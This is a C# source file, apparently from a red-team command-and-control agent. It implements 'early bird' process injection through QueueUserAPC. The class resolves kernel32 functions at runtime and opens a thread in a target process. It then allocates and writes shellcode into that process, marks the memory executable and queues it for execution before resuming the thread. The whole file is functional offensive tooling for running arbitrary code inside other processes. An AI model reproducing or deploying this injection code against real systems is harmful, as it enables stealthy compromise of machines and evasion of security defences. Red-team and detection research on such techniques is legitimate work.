using System;
using System.Diagnostics;
using ApolloInterop.Classes.Api;
using ApolloInterop.Classes.Core;
using ApolloInterop.Interfaces;
using static Injection.Shared.Win32;

namespace Injection.Techniques.EarlyBird
{
    public class QueueUserAPC : InjectionTechnique
    {
        private enum ThreadAccessRights : UInt32
        {
            SYNCHRONIZE = 0x00100000,
            THREAD_DIRECT_IMPERSONATION = 0x0200,
            THREAD_GET_CONTEXT = 0x0008,
            THREAD_IMPERSONATE = 0x0100,
            THREAD_QUERY_INFORMATION = 0x0040,
            THREAD_QUERY_LIMITED_INFORMATION = 0x0800,
            THREAD_SET_CONTEXT = 0x0010,
            THREAD_SET_INFORMATION = 0x0020,
            THREAD_SET_LIMITED_INFORMATION = 0x0400,
            THREAD_SET_THREAD_TOKEN = 0x0080,
            THREAD_SUSPEND_RESUME = 0x0002,
            THREAD_TERMINATE = 0x0001,
            STANDARD_RIGHTS_REQUIRED = 0x000F0000,
            THREAD_ALL_ACCESS = (STANDARD_RIGHTS_REQUIRED | SYNCHRONIZE | 0xFFFF)
        }
        private delegate IntPtr OpenThread(ThreadAccessRights dwDesiredAccess, bool bInheritHandle, uint dwThreadId);
        private delegate IntPtr VirtualAllocEx(
           IntPtr hProcess,
           IntPtr lpAddress,
           ulong dwSize,
           AllocationType flAllocationType,
           MemoryProtection flProtect);
        private delegate bool VirtualProtectEx(
            IntPtr hProcess,
            IntPtr lpAddress,
            uint dwSize,
            uint flNewProtect,
            out uint lpflOldProtect);
        private delegate bool WriteProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            byte[] lpBuffer,
            uint nSize,
            out uint lpNumberOfBytesWritten);
        private delegate bool QUAPC(IntPtr pfnAPC, IntPtr hThread, IntPtr dwData);
        private delegate int ResumeThread(IntPtr hThread);
        private delegate void CloseHandle(IntPtr handle);

        private OpenThread _pOpenThread;
        private VirtualAllocEx _pVirtualAllocEx;
        private WriteProcessMemory _pWriteProcessMemory;
        private QUAPC _pQUAPC;
        private ResumeThread _pResumeThread;
        private CloseHandle _pCloseHandle;
        private VirtualProtectEx _pVirtualProtectEx;
        public QueueUserAPC(IAgent agent, byte[] code, int pid) : base(agent, code, pid)
        {
            GetFunctionPointers();
        }

        public QueueUserAPC(IAgent agent, byte[] code, IntPtr hProcess) : base(agent, code, hProcess)
        {
            GetFunctionPointers();
        }

        private void GetFunctionPointers()
        {
            _pOpenThread = _agent.GetApi().GetLibraryFunction<OpenThread>(Library.KERNEL32, "OpenThread");
            _pVirtualAllocEx = _agent.GetApi().GetLibraryFunction<VirtualAllocEx>(Library.KERNEL32, "VirtualAllocEx");
            _pWriteProcessMemory = _agent.GetApi().GetLibraryFunction<WriteProcessMemory>(Library.KERNEL32, "WriteProcessMemory");
            _pQUAPC = _agent.GetApi().GetLibraryFunction<QUAPC>(Library.KERNEL32, "QueueUserAPC");
            _pResumeThread = _agent.GetApi().GetLibraryFunction<ResumeThread>(Library.KERNEL32, "ResumeThread");
            _pCloseHandle = _agent.GetApi().GetLibraryFunction<CloseHandle>(Library.KERNEL32, "CloseHandle");
            _pVirtualProtectEx = _agent.GetApi().GetLibraryFunction<VirtualProtectEx>(Library.KERNEL32, "VirtualProtectEx");
        }

        public override bool Inject(string arguments = "")
        {
            bool bRet = true;
            IntPtr hThread = IntPtr.Zero;
            // probably need to do some checking here to ensure process ID is instantiated
            var proc = System.Diagnostics.Process.GetProcessById(_processId);
            if (proc.Threads.Count == 0)
                throw new Exception($"Process {_processId} has no threads. Aborting.");
            if (proc.Threads[0].ThreadState != ThreadState.Wait)
            {
                throw new Exception("QueueUserAPC uses early bird injection and requires the thread to be in an initialized state.");
            }
            hThread = _pOpenThread(ThreadAccessRights.THREAD_ALL_ACCESS, true, (uint)proc.Threads[0].Id);

            if (hThread == IntPtr.Zero || hThread == null)
                return false;

            try
            {
                uint bytesWritten = 0;
                IntPtr allocSpace = _pVirtualAllocEx(
                    _hProcess,
                    IntPtr.Zero,
                    (ulong)_code.Length,
                    AllocationType.Commit | AllocationType.Reserve,
                    MemoryProtection.ReadWrite);
                if (allocSpace == IntPtr.Zero)
                {
                    bRet = false;
                }
                else
                {
                    bRet = _pWriteProcessMemory(_hProcess, allocSpace, _code, (uint)_code.Length, out bytesWritten);
                    if (bRet)
                    {
                        //Marshal.Copy(pic, 0, allocSpace, pic.Length);
                        uint flOldProtect = 0;
                        if (!_pVirtualProtectEx(_hProcess, allocSpace, (uint)_code.Length, (uint)MemoryProtection.ExecuteRead, out flOldProtect))
                            bRet = false;
                        else
                        {
                            //var argumentPointer = Marshal.StringToHGlobalAnsi(arguments);
                            if (!_pQUAPC(allocSpace, hThread, IntPtr.Zero))
                                bRet = false;
                            else
                            {
                                _pResumeThread(hThread);
                                bRet = true;
                            }
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                bRet = false;
            }
            finally
            {
                if (hThread != IntPtr.Zero)
                {
                    _pCloseHandle(hThread);
                }
            }
            return bRet;
        }
    }
}
